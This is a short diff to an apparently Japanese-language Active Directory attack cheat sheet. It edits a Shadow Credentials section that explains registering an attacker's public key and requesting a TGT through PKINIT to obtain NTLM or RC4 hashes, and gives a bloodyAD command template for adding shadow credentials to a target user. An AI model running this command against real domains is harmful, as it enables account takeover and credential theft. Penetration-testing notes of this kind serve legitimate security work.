@@ -133,7 +133,7 @@ SAN(Subject Alternative Name)を任意のユーザーで申請可能。
 # Shadow Credentials
 攻撃者が生成した公開鍵を登録し、PKINITでTGTを要求する。この過程でNTLMハッシュやRC4ハッシュを奪取する。
 ## Command
+### shadow credentials
 ```bash
 bloodyAD --host <Target> -d <Domain> -u <User> -p '<Password>' add shadowCredentials '<Target user>'
-
 ```
